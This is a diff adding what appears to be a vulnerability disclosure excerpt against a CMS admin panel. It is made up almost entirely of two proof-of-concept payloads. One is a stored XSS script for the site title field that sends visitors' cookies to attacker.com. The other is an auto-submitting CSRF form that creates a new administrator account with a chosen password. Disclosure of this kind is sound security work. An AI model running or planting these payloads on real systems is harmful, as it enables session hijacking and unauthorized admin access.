@@ -1,0 +1,26 @@
+Proof of Concept XSS:
+Enter the below into the site title field:
+<script>document.location="http://attacker.com/stealcookie.php?cookie=";
++ document.cookie</script>
+
+Proof of Concept CSRF:
+Example CSRF Request to create a new admin user with limited CSRF
+protection enabled:
+<html>
+<head></head>
+<body onLoad=javascript:document.form.submit()>
+<form action="
+http://x.x.x.x/admin/security/EditForm/field/Members/item/new/ItemEditForm";
+name="form" method="POST">
+<input type="text" name="FirstName" value="Alan">
+<input type="text" name="LastName" value="Jackson">
+<input type="text" name="Email" value="ajackson79 () outlook com">
+<input type="text" name=" Password[_Password]" value="Squash!">
+<input type="text" name=" Password[_ConfirmPassword]" value="Squash!">
+<input type="text" name="Locale" value="en_GB">
+<input type="text" name="SecurityID" value="528475a4e3c260bdffa3046c2b">
+<input type="text" name="action_doSave" value="1">
+</form>
+</body><br>
+</html>
+
